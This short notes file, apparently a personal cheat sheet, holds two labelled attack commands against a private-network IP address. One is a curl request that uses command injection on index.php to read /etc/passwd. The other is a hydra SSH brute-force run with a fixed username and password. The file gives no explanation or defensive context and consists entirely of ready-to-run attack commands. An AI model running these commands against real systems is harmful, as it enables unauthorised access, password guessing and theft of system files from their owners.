# Command Injection Attack
curl "http://192.168.15.139/index.php?cmd=cat+/etc/passwd"

# SSH Brute Force Attack
hydra -l envy -p 123456 ssh://192.168.15.139 -t 4 -V